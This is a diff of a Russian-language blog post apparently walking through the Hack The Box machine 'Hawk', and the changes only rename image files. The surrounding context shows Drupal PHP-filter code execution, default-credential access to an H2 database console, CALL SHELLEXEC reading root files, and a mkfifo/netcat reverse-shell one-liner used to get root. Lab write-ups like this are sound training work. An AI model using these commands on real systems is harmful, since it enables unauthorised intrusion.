@@ -14,10 +14,10 @@ published: true
 <!--cut-->
 
 {: .center-image}
-[![hawk-banner.png]({{ "/img/htb/boxes/hawk/hawk-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/146 "Hack The Box :: Hawk")
+[![banner.png]({{ "/img/htb/boxes/hawk/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/146 "Hack The Box :: Hawk")
 
 {: .center-image}
-![hawk-info.png]({{ "/img/htb/boxes/hawk/hawk-info.png" | relative_url }})
+![info.png]({{ "/img/htb/boxes/hawk/info.png" | relative_url }})
 
 * TOC
 {:toc}
@@ -446,7 +446,7 @@ IT department
 # Web — Порт 80
 А на `http://10.10.10.102:80` у нас... СMS Drupal :open_mouth:
 
-[![hawk-port80-browser-1.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-1.png" | relative_url }})
+[![port80-browser-1.png]({{ "/img/htb/boxes/hawk/port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port80-browser-1.png" | relative_url }})
 
 После выяснения, какие пользователи существуют в CMS (через абьюзинг формы регистрации), логинимся с кредами `admin:PencilKeyboardScanner123` и попадаем в админку. Оттуда после небольшой разведки выясняем, что в системе управления содержимым установлен модуль "PHP Filter", что дает нам возможность выполнения произвольного PHP-кода на сервере.
 
@@ -454,11 +454,11 @@ IT department
 
 Вот, как все выглядело в картинках:
 
-[![hawk-port80-browser-2.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-2.png" | relative_url }})
+[![port80-browser-2.png]({{ "/img/htb/boxes/hawk/port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port80-browser-2.png" | relative_url }})
 
-[![hawk-port80-browser-3.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-3.png" | relative_url }})
+[![port80-browser-3.png]({{ "/img/htb/boxes/hawk/port80-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port80-browser-3.png" | relative_url }})
 
-[![hawk-port80-browser-4.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-4.png" | relative_url }})
+[![port80-browser-4.png]({{ "/img/htb/boxes/hawk/port80-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port80-browser-4.png" | relative_url }})
 
 # Drupal Reverse-Shell (внутри машины)
 Получив отклик на листенер, апгрейдим шелл до полноценного PTY'я, [как я показывал как-то раз на форуме HTB](https://forum.hackthebox.eu/discussion/comment/22312/#Comment_22312 "Obtaining a Fully Interactive Shell — Hack The Box :: Forums"), и мы внутри:
@@ -530,7 +530,7 @@ root        795  0.1 13.7 2351068 135272 ?      Sl   Dec07   1:34 /usr/bin/java 
 # Web — Порт 8082
 Перейдя по `http://10.10.10.102:8082` нас ждет сообщение:
 
-[![hawk-port8082-browser-1.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-1.png" | relative_url }})
+[![port8082-browser-1.png]({{ "/img/htb/boxes/hawk/port8082-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port8082-browser-1.png" | relative_url }})
 
 Как и обещал nmap — это веб-консоль базы H2.
 
@@ -550,11 +550,11 @@ root@kali:~# sshpass -p 'drupal4hawk' ssh -oStrictHostKeyChecking=no -L 8082:127
 
 И попробуем авторизоваться в веб-консоле H2, которая поселилась по адресу `http://127.0.0.1:8082`:
 
-[![hawk-port8082-browser-2.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-2.png" | relative_url }})
+[![port8082-browser-2.png]({{ "/img/htb/boxes/hawk/port8082-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port8082-browser-2.png" | relative_url }})
 
 Подключиться к БД `jdbc:h2:~/test` не удалось, т. к. она **существует и** мы не знаем нужных кредов. Но вот если попробовать присоединиться к **несуществующей** базе, то она автоматически будет создана, и залогиниться можно будет с кредами по умолчанию `sa:`:
 
-[![hawk-port8082-browser-3.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-3.png" | relative_url }})
+[![port8082-browser-3.png]({{ "/img/htb/boxes/hawk/port8082-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port8082-browser-3.png" | relative_url }})
 
 Есть контакт, и мы внутри.
 
@@ -571,7 +571,7 @@ CALL SHELLEXEC('cat /root/root.txt')
 
 ### root.txt
 
-[![hawk-port8082-browser-4.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-4.png" | relative_url }})
+[![port8082-browser-4.png]({{ "/img/htb/boxes/hawk/port8082-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port8082-browser-4.png" | relative_url }})
 
 И напоследок, чтобы с чистой совестью отправить эту машину в утиль, получим root-сессию. Сделать это почти так же просто — для этого сперва создадим bash-reverse-shell на машине-жертве (чтобы не мучаться с "плохими" символами в веб-консоли):
 ```text
@@ -580,7 +580,7 @@ daniel@hawk:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10
 
 После чего запустим этот шелл, слушая при этом 8881-й порт:
 
-[![hawk-port8082-browser-5.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-5.png" | relative_url }})
+[![port8082-browser-5.png]({{ "/img/htb/boxes/hawk/port8082-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/hawk/port8082-browser-5.png" | relative_url }})
 
 ```text
 root@kali:~# nc -lvnp 8881
@@ -601,10 +601,10 @@ uid=0(root) gid=0(root) groups=0(root)
 Приручайте ястребов, спасибо за внимание :innocent:
 
 {: .center-image}
-![hawk-owned-user.png]({{ "/img/htb/boxes/hawk/hawk-owned-user.png" | relative_url }})
+![owned-user.png]({{ "/img/htb/boxes/hawk/owned-user.png" | relative_url }})
 
 {: .center-image}
-![hawk-owned-root.png]({{ "/img/htb/boxes/hawk/hawk-owned-root.png" | relative_url }})
+![owned-root.png]({{ "/img/htb/boxes/hawk/owned-root.png" | relative_url }})
 
 {: .center-image}
-![hawk-trophy.png]({{ "/img/htb/boxes/hawk/hawk-trophy.png" | relative_url }})
+![trophy.png]({{ "/img/htb/boxes/hawk/trophy.png" | relative_url }})
